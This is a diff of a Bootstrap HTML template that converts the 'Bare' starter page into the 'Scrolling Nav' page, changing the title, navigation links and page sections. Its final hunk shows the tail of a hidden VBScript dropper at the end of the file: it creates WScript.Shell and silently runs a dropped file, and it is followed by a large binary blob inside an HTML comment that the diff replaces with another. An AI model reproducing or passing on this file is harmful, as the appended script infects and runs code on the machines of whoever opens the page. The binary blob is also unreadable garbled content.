@@ -9,18 +9,13 @@
     <meta name="description" content="">
     <meta name="author" content="">
 
-    <title>Bare - Start Bootstrap Template</title>
+    <title>Scrolling Nav - Start Bootstrap Template</title>
 
     <!-- Bootstrap Core CSS -->
     <link href="css/bootstrap.min.css" rel="stylesheet">
 
     <!-- Custom CSS -->
-    <style>
-    body {
-        padding-top: 70px;
-        /* Required padding for .navbar-fixed-top. Remove if using .navbar-static-top. Change if height of navigation changes. */
-    }
-    </style>
+    <link href="css/scrolling-nav.css" rel="stylesheet">
 
     <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
     <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
@@ -31,32 +26,38 @@
 
 </head>
 
-<body>
+<!-- The #page-top ID is part of the scrolling feature - the data-spy and data-target are part of the built-in Bootstrap scrollspy function -->
+
+<body id="page-top" data-spy="scroll" data-target=".navbar-fixed-top">
 
     <!-- Navigation -->
-    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <nav class="navbar navbar-default navbar-fixed-top" role="navigation">
         <div class="container">
-            <!-- Brand and toggle get grouped for better mobile display -->
-            <div class="navbar-header">
-                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                     <span class="sr-only">Toggle navigation</span>
                     <span class="icon-bar"></span>
                     <span class="icon-bar"></span>
                     <span class="icon-bar"></span>
                 </button>
-                <a class="navbar-brand" href="#">Start Bootstrap</a>
+                <a class="navbar-brand page-scroll" href="#page-top">Start Bootstrap</a>
             </div>
+
             <!-- Collect the nav links, forms, and other content for toggling -->
-            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <div class="collapse navbar-collapse navbar-ex1-collapse">
                 <ul class="nav navbar-nav">
-                    <li>
-                        <a href="#">About</a>
+                    <!-- Hidden li included to remove active class from about link when scrolled up past about section -->
+                    <li class="hidden">
+                        <a class="page-scroll" href="#page-top"></a>
                     </li>
                     <li>
-                        <a href="#">Services</a>
+                        <a class="page-scroll" href="#about">About</a>
                     </li>
                     <li>
-                        <a href="#">Contact</a>
+                        <a class="page-scroll" href="#services">Services</a>
+                    </li>
+                    <li>
+                        <a class="page-scroll" href="#contact">Contact</a>
                     </li>
                 </ul>
             </div>
@@ -65,29 +66,61 @@
         <!-- /.container -->
     </nav>
 
-    <!-- Page Content -->
-    <div class="container">
-
-        <div class="row">
-            <div class="col-lg-12 text-center">
-                <h1>A Bootstrap Starter Template</h1>
-                <p class="lead">Complete with pre-defined file paths that you won't have to change!</p>
-                <ul class="list-unstyled">
-                    <li>Bootstrap v3.3.1</li>
-                    <li>jQuery v1.11.1</li>
-                </ul>
+    <!-- Intro Section -->
+    <section id="intro" class="intro-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12">
+                    <h1>Scrolling Nav</h1>
+                    <p><strong>Usage Instructions:</strong> Make sure to include the <code>scrolling-nav.js</code>, <code>jquery.easing.min.js</code>, and <code>scrolling-nav.css</code> files. To make a link smooth scroll to another section on the page, give the link the <code>.page-scroll</code> class and set the link target to a corresponding ID on the page.</p>
+                    <a class="btn btn-default page-scroll" href="#about">Click Me to Scroll Down!</a>
+                </div>
             </div>
         </div>
-        <!-- /.row -->
+    </section>
 
-    </div>
-    <!-- /.container -->
+    <!-- About Section -->
+    <section id="about" class="about-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12">
+                    <h1>About Section</h1>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    <!-- jQuery Version 1.11.1 -->
+    <!-- Services Section -->
+    <section id="services" class="services-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12">
+                    <h1>Services Section</h1>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="contact-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12">
+                    <h1>Contact Section</h1>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- jQuery -->
     <script src="js/jquery.js"></script>
 
     <!-- Bootstrap Core JavaScript -->
     <script src="js/bootstrap.min.js"></script>
+
+    <!-- Scrolling Nav JavaScript -->
+    <script src="js/jquery.easing.min.js"></script>
+    <script src="js/scrolling-nav.js"></script>
 
 </body>
 
@@ -106,4 +139,8 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--#èNÐÂ¸ÞŸÒ>#ëð*NSwýÇ[™†Ñ Ž–óŠ<òW^	È<ÑQÔÞñÎúGmªƒÐÈ™Tr€®×èñÞ*oú’QËöÛ^¿rJ¶yÐVýnIããEkqÄ× ò(Ä¯V)ûNøk€â©•\Gë0]p†;±ÖpÑDABÊmõ†ËdºÉÜ³RÞÑçüBãxƒëC@ÇIn_Y’ý_în¤Â¬£LÔ é{ˆ·{CŽ¾©¸a³§pû‘æEÑÞD€®™W­ò_eö}H€XƒÊbƒøÐdr$Ú»rÎ ŠÉ7Æ¿žˆQ‘72LÎÀ²^¾“!wm÷‰ÃÙ¡X†áÔÔÁ4-[Ú ŽûÓD‚^wGŒW!m8jÅ=Nô}pYð¤¹ýï™üE»‘x°VÒ’¹lÄcü@Ô¸§ü«øw×[oÔ­¾nÀ;½$§ °ud?"QÉ4Tz¦šEç¥äRÉWµ¶•d~Þ1\®Ú˜,û]'~ô–:ÕºB’è#0'GƒÌb£}-6»Í¬É:_3M…6ðO1ÍÛðŒ>TŽO‘úá¾ó{Â·ËÕÍõK6ÔJ-èÓ¶„¨¤ çIR$RøçIçIçIÅ&ªN,ÍàW/ëI çI-->
+//--></SCRIPT><!--{Ùk”½V2¼ÆB×òù
+cá“¾úÇõÃušf·«zìÑ°]In•›_2³Œ} £ìIx–§3˜%X§jd8U [¡Ç\”Êj@¬­C`bO:q´:wß°DOŒ)¯T4ZöRÖw£CZÚ¸³¹wfŸu‹¯áÚÓ
+î£õ„ñš¤‚=9/`‰ó«HÇª
+]ÈJ9Äé¯	ÌÇ^vé–¯Éö€¼‡´ÏÈÜ‚¯ÓK,5Nä¯^ž‚zÞˆàS¬¨¶[¶Úô‰¨à,°q- Î@#V"¥vÆ»!ØrO®Å°cS­	ƒVp‹8æY³=]C!åuÖ|KÇcD÷ÝºAéíŒìpEŠH·&ïf™õGÉ„’w°ÇÒªš¦
+v#·ÕLâ¨I	])mó¨ÇÜ 6"‰â=ûWú”²‰;Ë¾ýÀuÚ¢QÁ0õÉÖÈEåºDjf#-^5ü“RC'G)Õ1aÙºHq	È¤>ËM§$f|dÈK~í”UÅ*·+‹`xû¤¦º¥þ‘ çIR$RøçIçIçIÅ&ªN-ÍàWgõI çI-->
